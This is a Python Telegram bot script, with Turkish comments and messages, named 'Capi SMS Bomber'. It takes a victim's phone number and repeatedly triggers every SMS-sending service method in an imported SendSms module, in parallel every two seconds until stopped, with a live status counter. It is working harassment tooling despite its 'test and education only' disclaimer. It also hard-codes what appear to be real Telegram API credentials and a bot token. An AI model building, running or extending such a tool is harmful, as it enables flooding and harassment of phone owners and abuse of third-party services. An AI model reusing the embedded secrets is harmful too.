from telethon import TelegramClient, events
from telethon.tl.custom import Button
from sms import SendSms
import asyncio
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import logging

# ——————————————————————
#  Telegram API bilgileri
# ——————————————————————
api_id    = 23350184
api_hash  = "41f0c2a157268e158f91ab7d59f4fc19"
bot_token = "7107604320:AAEcx_S-aa8IwW8PiOWcAdNm_dAX0EczFX4"

# ——————————————————————
#  Log ayarları: konsolda detaylı bilgi
# ——————————————————————
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)

# Bot başlat
client = TelegramClient('smsbomber_bot', api_id, api_hash).start(bot_token=bot_token)

# Global task ve sayaç depoları
active_tasks  = {}  # user_id → asyncio.Task
status_counts = {}  # user_id → {'basarili': int, 'basarisiz': int}
executor      = ThreadPoolExecutor(max_workers=50)


# ——————————————————————
#  /start → Hoş geldin & komutlar
# ——————————————————————
@client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond(
        "**🚀 Capi SMS Bomber’a Hoş Geldin!**\n\n"
        "Bu bot, `sms.py` içindeki servislerle SMS bombardımanı yapar.\n\n"
        "**Komutlar:**\n"
        "📲 `/sms <telefon>` — Bombardımanı başlat\n"
        "⛔ `/stop` — Bombardımanı durdur\n"
        "🔧 `/servisler` — Toplam servis sayısı\n"
        "ℹ️ `/help` — Yardım menüsü\n\n"
        "_⚠️ Bu araç yalnızca **test ve eğitim** amaçlıdır. Yasal sorumluluk kullanıcıya aittir._",
        buttons=[
            [
                Button.url("👤 Owner", "https://t.me/ramazanozturk0"),
                Button.url("📥 T.me/capiyedek", "https://t.me/capiyedek")
            ],
            [
                Button.url("📢 Kanal: TurkUserBotKanali", "https://t.me/TurkUserBotKanali")
            ]
        ],
        parse_mode='markdown'
    )


# ——————————————————————
#  /help → Yardım menüsü
# ——————————————————————
@client.on(events.NewMessage(pattern='/help'))
async def help_handler(event):
    await event.respond(
        "**📘 Yardım Menüsü**\n\n"
        "🔹 `/sms <telefon>` → SMS bombardımanı başlatır\n"
        "🔹 `/stop` → Aktif bombardımanı durdurur\n"
        "🔹 `/servisler` → Servis sayısını gösterir\n"
        "🔹 `/start` → Hoş geldin mesajını tekrar gösterir"
    )


# ——————————————————————
#  /servisler → Servis sayısını göster
# ——————————————————————
@client.on(events.NewMessage(pattern='/servisler'))
async def service_count_handler(event):
    dummy = SendSms("0000000000", "")
    count = len([
        m for m in dir(SendSms)
        if callable(getattr(dummy, m)) and not m.startswith("__")
    ])
    await event.respond(f"🔧 Toplam aktif servis sayısı: **{count}** adet", parse_mode='markdown')


# ——————————————————————
#  /sms 1234567890 → Bombardımanı başlat
# ——————————————————————
@client.on(events.NewMessage(pattern=r'/sms (\d{10})'))
async def sms_handler(event):
    user_id = event.chat_id
    phone   = event.pattern_match.group(1)

    # Sayaçları sıfırla
    status_counts[user_id] = {"basarili": 0, "basarisiz": 0}

    await event.respond(f"📲 SMS gönderimi başlatılıyor: `0{phone}`", parse_mode='markdown')
    logging.info(f"{user_id} için gönderim başladı: 0{phone}")

    send_sms = SendSms(phone, "")
    services = [
        getattr(send_sms, fn)
        for fn in dir(SendSms)
        if callable(getattr(send_sms, fn)) and not fn.startswith("__")
    ]

    status_msg = await event.respond("```\n🚀 SMS gönderimi başlatılıyor...\n```")

    async def spam():
        try:
            while user_id in active_tasks:
                loop = asyncio.get_event_loop()
                futures = [loop.run_in_executor(executor, svc) for svc in services]
                results = await asyncio.gather(*futures, return_exceptions=True)

                for r in results:
                    if isinstance(r, Exception):
                        status_counts[user_id]["basarisiz"] += 1
                    elif r:
                        status_counts[user_id]["basarili"] += 1
                    else:
                        status_counts[user_id]["basarisiz"] += 1

                # Güncel metin
                text = (
                    "```\n"
                    "╔═════════════════════════╗\n"
                    f"║ ✔ Başarılı : {status_counts[user_id]['basarili']:>5}     ║\n"
                    f"║ ❌ Başarısız: {status_counts[user_id]['basarisiz']:>5}     ║\n"
                    "╚═════════════════════════╝\n"
                    f"🕐 Güncelleme: {datetime.now().strftime('%H:%M:%S')}\n```"
                )

                await status_msg.edit(text, parse_mode='markdown')

                logging.info(f"[+] 0{phone} → ✔️{status_counts[user_id]['basarili']}, ❌{status_counts[user_id]['basarisiz']}")
                await asyncio.sleep(2)

        except asyncio.CancelledError:
            logging.info(f"{user_id} gönderimi iptal etti.")

    task = asyncio.create_task(spam())
    active_tasks[user_id] = task


# ——————————————————————
#  /stop → Bombardımanı durdur
# ——————————————————————
@client.on(events.NewMessage(pattern='/stop'))
async def stop_handler(event):
    user_id = event.chat_id
    task = active_tasks.pop(user_id, None)
    if task:
        task.cancel()
        await event.respond("⛔ SMS bombardımanı başarıyla durduruldu.")
        logging.info(f"{user_id} bombardımanı durdurdu.")
    else:
        await event.respond("❗ Şu anda çalışan bir işlem yok.")


# ——————————————————————
#  Botu başlat
# ——————————————————————
if __name__ == "__main__":
    client.run_until_disconnected()